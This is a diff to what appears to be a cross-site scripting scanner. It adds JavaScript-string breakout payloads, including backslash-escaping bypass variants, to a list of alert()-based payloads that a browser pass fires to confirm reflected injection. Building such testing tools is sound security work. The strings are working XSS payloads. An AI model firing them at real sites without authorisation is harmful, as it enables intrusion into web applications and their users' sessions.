@@ -43,7 +43,10 @@ BREAKOUTS = {
 # they stay candidates for the browser-execution pass to confirm.
 EXECUTABLE_ON_REFLECTION = {"html", "attr_dq", "attr_sq"}
 
-# Auto-firing execution payloads for the browser confirmation pass.
+# Auto-firing execution payloads for the browser confirmation pass. Ordered HTML-context first, then
+# JS-STRING context (a value reflected inside a quoted JS string, e.g. `var x='HERE'`) — including a
+# leading-backslash variant that neutralises an app that escapes the quote (\' ) but not the backslash,
+# the classic backslash-escaping bypass. General across any JS-string reflection, not GinAndJuice-specific.
 EXEC_PAYLOADS = (
     f'"><img src=x onerror=alert("{MARK}")>',
     f"'><img src=x onerror=alert('{MARK}')>",
@@ -51,6 +54,13 @@ EXEC_PAYLOADS = (
     f'"><svg onload=alert("{MARK}")>',
     f"</script><svg onload=alert('{MARK}')>",
     f'javascript:alert("{MARK}")',
+    # JS-string breakouts (single/double quote; plain + backslash-bypass; concat + statement forms)
+    "';alert('" + MARK + "')//",
+    "\";alert('" + MARK + "')//",
+    "\\';alert('" + MARK + "')//",
+    "\\\";alert('" + MARK + "')//",
+    "'-alert('" + MARK + "')-'",
+    "\"-alert('" + MARK + "')-\"",
 )
 
 
